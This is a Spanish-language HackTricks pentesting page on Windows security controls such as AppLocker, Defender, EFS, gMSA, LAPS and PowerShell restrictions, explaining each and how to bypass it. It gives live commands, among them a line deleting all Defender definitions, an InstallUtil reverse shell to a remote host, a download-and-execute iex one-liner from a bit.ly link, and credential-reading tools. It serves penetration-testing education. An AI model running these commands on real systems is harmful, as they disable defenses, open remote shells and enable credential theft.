# Controles de Seguridad de Windows

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, potenciados por las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que se permite que estén presentes y se ejecuten en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se alinea con las necesidades comerciales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y otorga a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un control **granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLLs, aplicaciones empaquetadas y instaladores de aplicaciones empaquetadas.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto puede ser eludido**.

### Verificar

Verifica qué archivos/extenciones están en la lista negra/blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Las reglas de AppLocker aplicadas a un host también pueden ser **leídas desde el registro local** en **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Evasión

* **Carpetas escribibles** útiles para evadir la Política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **evadir esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Los binarios comúnmente **confiables** [**"LOLBAS's"**](https://lolbas-project.github.io/) también pueden ser útiles para eludir AppLocker.
* **Las reglas mal escritas también pueden ser eludidas**
* Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear un **directorio llamado `allowed`** en cualquier lugar y será permitido.
* Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan las **otras** [**ubicaciones del ejecutable de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* **La aplicación de DLL raramente está habilitada** debido a la carga adicional que puede imponer en un sistema y la cantidad de pruebas necesarias para asegurar que nada se rompa. Por lo tanto, usar **DLLs como puertas traseras ayudará a eludir AppLocker**.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y eludir AppLocker. Para más información consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de Credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo, las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por razones de Single Sign-On.\
**LSA** administra la **política de seguridad local** (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será quien **verifique** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **hable** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contraseñas fácilmente descifrables.

### Secretos de LSA

LSA podría guardar en disco algunas credenciales:

* Contraseña de la cuenta de computadora del Active Directory (controlador de dominio inaccesible).
* Contraseñas de las cuentas de servicios de Windows
* Contraseñas para tareas programadas
* Más (contraseña de aplicaciones IIS...)

### NTDS.dit

Es la base de datos del Active Directory. Solo está presente en los Controladores de Dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un Antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de **eludir estas protecciones**.

### Verificar

Para verificar el **estado** de **Defender** puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (revisa el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo también podrías ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Sistema de Archivos Encriptados)

EFS funciona encriptando un archivo con una **clave simétrica** masiva, también conocida como Clave de Encriptación de Archivo, o **FEK**. La FEK es entonces **encriptada** con una **clave pública** asociada al usuario que encriptó el archivo, y esta FEK encriptada se almacena en el **flujo de datos alternativo** $EFS del archivo encriptado. Para desencriptar el archivo, el controlador de componente EFS utiliza la **clave privada** que coincide con el certificado digital EFS (usado para encriptar el archivo) para desencriptar la clave simétrica almacenada en el flujo $EFS. Desde [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).

Ejemplos de archivos siendo desencriptados sin que el usuario lo solicite:

* Archivos y carpetas son desencriptados antes de ser copiados a un volumen formateado con otro sistema de archivos, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table).
* Archivos encriptados son copiados a través de la red usando el protocolo SMB/CIFS, los archivos son desencriptados antes de ser enviados por la red.

Los archivos encriptados usando este método pueden ser **accedidos de manera transparente por el usuario propietario** (el que los ha encriptado), así que si puedes **convertirte en ese usuario** puedes desencriptar los archivos (cambiar la contraseña del usuario e iniciar sesión como él no funcionará).

### Verificar información de EFS

Verifica si un **usuario** ha **usado** este **servicio** comprobando si existe esta ruta: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifica **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos

### Desencriptar archivos EFS

#### Siendo Sistema de Autoridad

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. Si ese es el caso, usando una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O podrías simplemente `migrar` al proceso del usuario.

#### Conociendo la contraseña del usuario

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Cuentas de Servicio Administradas por Grupo (gMSA)

En la mayoría de las infraestructuras, las cuentas de servicio son cuentas de usuario típicas con la opción “**Contraseña nunca expira**”. Mantener estas cuentas podría ser un verdadero lío y es por eso que Microsoft introdujo **Cuentas de Servicio Administradas:**

* No más gestión de contraseñas. Utiliza una contraseña compleja y aleatoria de 240 caracteres y la cambia automáticamente cuando alcanza la fecha de expiración de la contraseña del dominio o del ordenador.
* Utiliza el Servicio de Distribución de Claves de Microsoft (KDC) para crear y gestionar las contraseñas para la gMSA.
* No puede ser bloqueada ni utilizada para inicio de sesión interactivo
* Soporta compartirse entre múltiples hosts
* Puede usarse para ejecutar tareas programadas (las cuentas de servicio administradas no soportan ejecutar tareas programadas)
* Gestión simplificada de SPN – El sistema cambiará automáticamente el valor de SPN si los detalles de **sAMaccount** del ordenador cambian o la propiedad del nombre DNS cambia.

Las cuentas gMSA tienen sus contraseñas almacenadas en una propiedad LDAP llamada _**msDS-ManagedPassword**_ que se **restablece automáticamente** por los DC cada 30 días, son **recuperables** por **administradores autorizados** y por los **servidores** en los que están instalados. _**msDS-ManagedPassword**_ es un blob de datos encriptados llamado [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) y solo es recuperable cuando la conexión está asegurada, **LDAPS** o cuando el tipo de autenticación es 'Sealing & Secure' por ejemplo.

![Imagen de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Entonces, si se está utilizando gMSA, averigua si tiene **privilegios especiales** y también verifica si tienes **permisos** para **leer** la contraseña de los servicios.

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **ataque de retransmisión NTLM** para **leer** la **contraseña** de **gMSA**.

## LAPS

[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) te permite **administrar la contraseña del Administrador local** (que es **aleatoria**, única y **cambia regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan centralmente en Active Directory y están restringidas a usuarios autorizados mediante ACLs. Si a tu usuario se le otorgan suficientes permisos, podrías ser capaz de leer las contraseñas de los administradores locales.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Lenguaje Restringido de PS

PowerShell [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **limita muchas de las características** necesarias para usar PowerShell de manera efectiva, como bloquear objetos COM, solo permitir tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Evasión
```powershell
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows, ese Bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que necesites** **añadir una referencia** -> _Buscar_ -> _Buscar_ -> añadir `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puede utilizar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y evitar el modo restringido. Para más información, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Ejecución de PS

Por defecto está configurada en **restringido**. Principales formas de evitar esta política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfaz del Proveedor de Soporte de Seguridad (SSPI)

Es la API que se puede usar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que quieran comunicarse. El método preferido para esto es Kerberos. Luego, el SSPI negociará qué protocolo de autenticación se utilizará, estos protocolos de autenticación se llaman Proveedor de Soporte de Seguridad (SSP), se encuentran dentro de cada máquina Windows en forma de una DLL y ambas máquinas deben admitir el mismo para poder comunicarse.

### Principales SSPs

* **Kerberos**: El preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: Por razones de compatibilidad
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Se utiliza para negociar el protocolo a usar (siendo Kerberos o NTLM, siendo Kerberos el predeterminado)
* %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de Cuentas de Usuario

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una **solicitud de consentimiento para actividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, potenciados por las herramientas comunitarias **más avanzadas**.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
